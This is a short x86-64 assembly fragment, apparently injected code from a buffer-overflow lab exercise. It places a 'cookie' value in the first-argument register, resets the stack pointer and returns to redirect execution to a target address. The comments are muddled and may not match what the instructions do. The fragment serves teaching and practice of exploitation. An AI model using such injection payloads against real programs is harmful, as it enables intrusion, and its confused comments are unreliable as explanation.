movq $0x2d274378, %rdi   #place cookie as first argument
movq $0x5567e5A2, %rsp
retq                     #we want to get to 0x4017d4 (in little endian 0xd41740) #address of rsp
